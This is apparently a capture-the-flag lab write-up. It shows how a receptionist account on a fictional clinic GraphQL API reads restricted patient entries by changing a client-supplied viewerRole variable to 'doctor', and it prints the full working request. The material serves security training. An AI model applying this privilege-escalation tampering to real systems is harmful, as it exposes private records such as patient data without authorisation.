---

Name: Clearance
Difficulty: Medium
URL: https://dashboard.webverselabs-pro.com/learning-paths/junior-web-hacker/04/Clearance
Description: CliniCore shipped a GraphQL API to power their new timeline feature. A viewerRole variable was added during development to allow the admin panel to preview how different roles see patient data. It was never removed from the production schema. A receptionist account with routine access to the system is all you need. 

---

## Initial Request

After logging in with the provided receptionist account, the application sends a GraphQL request to `/graphql`:

```json
{
  "query": "query GT($patientId: ID!, $viewerRole: String!) { patientTimeline(patientId: $patientId, viewerRole: $viewerRole) { patient { id name dob department } entries { id date type note restricted } }}",
  "variables": {
    "patientId": "2",
    "viewerRole": "receptionist"
  }
}
```

The important part is:

```json
"viewerRole": "receptionist"
```

The frontend obtains the real account role from `/api/me`:

```javascript
fetch('/api/me', { credentials: 'same-origin' })
```

and then uses it when constructing the GraphQL request:

```javascript
var viewerRole = window._CLINICORE_ROLE || 'receptionist';
```

So, by default, a receptionist sends:

```text
viewerRole=receptionist
```

## Investigating the Roles

The API documentation contained a list of valid roles:

```text
receptionist
nurse
doctor
admin
```

It also explained that staff roles are static and cannot be changed through the public API.

This is an important distinction: I did **not** need to change my actual account's role.

Instead, the GraphQL request contains a separate `viewerRole` parameter that can be controlled by the client.

I first tried changing it to:

```text
admin
```

but this did not reveal anything useful.

I then tested the other documented roles.

Changing:

```json
"viewerRole": "receptionist"
```

to:

```json
"viewerRole": "doctor"
```

changed the response and revealed the restricted information/flag.

## Exploitation

The final request was therefore the same GraphQL query, but with `viewerRole` changed to `doctor`:

```json
{
  "query": "query GT($patientId: ID!, $viewerRole: String!) { patientTimeline(patientId: $patientId, viewerRole: $viewerRole) { patient { id name dob department } entries { id date type note restricted } }}",
  "variables": {
    "patientId": "2",
    "viewerRole": "doctor"
  }
}
```

The important point is that the authenticated account is still only a receptionist. I did not modify the session, account role, or authentication state.

I simply supplied a different role to the GraphQL resolver.

The API then evaluated the timeline using the privileges associated with the `doctor` role and returned the restricted entry, which contained the flag.
